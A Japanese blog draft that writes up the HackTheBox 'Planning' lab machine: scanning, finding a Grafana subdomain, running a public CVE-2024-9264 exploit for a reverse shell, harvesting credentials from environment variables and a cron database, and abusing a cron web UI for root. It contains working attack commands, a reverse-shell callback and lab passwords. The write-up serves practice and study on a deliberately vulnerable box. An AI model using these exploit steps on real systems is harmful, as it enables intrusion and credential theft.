+++
author = "Hugo Authors"
title = "HTB Planning"
date = "2025-06-01"
description = ""
tags = [
    "HTB",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
draft = true
+++

HTB Planningのメモ．
<!--more-->

参考： https://medium.com/@ahmedshaban7000/htb-planning-write-up-c154b9577698

Machine Information:  
As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r

```
$ nmap -Pn -T4 -A -v 10.10.11.68
PORT   STATE SERVICE VERSION                                                                 
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)          
| ssh-hostkey:                                                                               
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)                              
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)                            
80/tcp open  http    nginx 1.24.0 (Ubuntu)                                                   
| http-methods:                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                 
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

Webサイトがあるので，以下を追加してアクセス．

```
$ sudo vi /etc/hosts
10.10.11.68     planning.htb
```

怪しいディレクトリを探すも特になし．

```
$ ffuf -w wordlists.txt -u http://planning.htb/FUZZ

index.php               [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 186ms]
js/                     [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 184ms]
lib/                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 239ms]
:: Progress: [5365/5365] :: Job [1/1] :: 156 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

サブドメインを探すと，`grafana`を発見．

```
$ ffuf -w subdomains.txt -u http://planning.htb/ -H "Host:FUZZ.planning.htb" -c -fs 178

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 307ms]
```

```
$ sudo vi /etc/hosts
10.10.11.68     grafana.planning.htb
```

Grafana SQL Expressions allow for remote code execution `CVE-2024-9264` の脆弱性あり．

以下の攻撃コードを利用．

CVE-2024-9264-RCE-Exploit in Grafana via SQL Expressions:  
https://github-com.translate.goog/z3k0sec/CVE-2024-9264-RCE-Exploit?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en

```
python poc.py --url http://grafana.planning.htb:80 --username admin --password 0D5oT70Fq13EvB5r --reverse-ip [自分のIPアドレス] --reverse-port 9001
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9001
Failed to trigger reverse shell: 504 <html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.24.0 (Ubuntu)</center>
</body>
</html>
```

攻撃コードを実行する前にNetCatで待ち受けておく必要があった．

```
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.■■■■■] from (UNKNOWN) [10.10.11.68] 33740
sh: 0: can't access tty; job control turned off
# pwd
/usr/share/grafana
# ls
LICENSE
bin
conf
public
# id
uid=0(root) gid=0(root) groups=0(root)
# find / -name user.txt
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=user.txt
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```

sshのユーザ名：`enzo`，パスワード：`RioTecRANDEntANT!`とわかる．

```
ssh enzo@planning.htb
enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)

enzo@planning:~$ ls
user.txt

nzo@planning:~$ cat user.txt
b3d4a4e7aab9d66372ecef421ee31983
```

```
enzo@planning:~$ cat /opt/crontabs/crontab.db | jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",                                      
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```

```
enzo@planning:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:40787         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.54:53           0.0.0.0:*                          
udp        0      0 127.0.0.53:53           0.0.0.0:*
```

以下のように，ローカルポートフォワーディングを用いて，`http://localhost:8888/`にアクセスできるようにする．

```
$ ssh -L 8888:localhost:8000 enzo@10.10.11.68 
```

`http://localhost:8888/`にアクセスし，root / P4ssw0rdS0pRi0T3c でログインする．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/htb-planning/im01.png)

以下のように`cat /root/root.txt > /home/enzo/flag` を実行するjobを作成し，実行する．

![This is a image](https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/htb-planning/im02.png)

```
enzo@planning:~$ ls
flag　user.txt

enzo@planning:~$ cat flag
36d0f4e90aa1e19f8be13232d57c811f
```